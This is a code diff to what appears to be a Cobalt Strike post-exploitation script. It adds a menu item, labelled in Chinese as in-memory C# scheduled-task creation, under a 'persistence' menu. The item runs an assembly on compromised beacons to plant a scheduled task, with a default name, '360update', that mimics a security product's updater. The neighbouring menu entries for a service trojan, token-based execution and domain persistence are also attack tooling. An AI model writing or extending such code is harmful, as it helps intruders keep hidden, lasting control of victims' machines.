@@ -310,6 +310,21 @@ sub tokenrun{
 	dialog_show($dialog);
 }
 
+sub csharpaddtask_{
+	foreach $id ($bid){
+		bexecute_assembly($id, script_resource("addtask.exe"), "$3['taskName'] $3['taskPath']");
+	}
+}
+
+sub csharpaddtask{
+	$dialog = dialog("addtask", %(bid => $bid, taskName => "360update", taskPath => "C:\\Windows\\System32\\notepad.exe"), &csharpaddtask_);
+	dialog_description($dialog, "<taskName> <taskPath> taskName计划任务的名称,taskPath计划任务的目标程序");
+	drow_text($dialog, "taskName","taskName:");
+	drow_text($dialog, "taskPath", "taskPath:");
+	dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
 popup beacon_bottom{
 	menu "&权限维持"{
 		item "&cs服务马"{
@@ -359,6 +374,11 @@ popup beacon_bottom{
 		item "&以某个进程的Token运行EXE"{
 			$bid = $1;
 			tokenrun($bid);
+		}
+		
+		item "&内存加载(C#)添加计划"{
+			$bid = $1;
+			csharpaddtask($bid);
 		}
 		
 		menu "&域权限维持" {
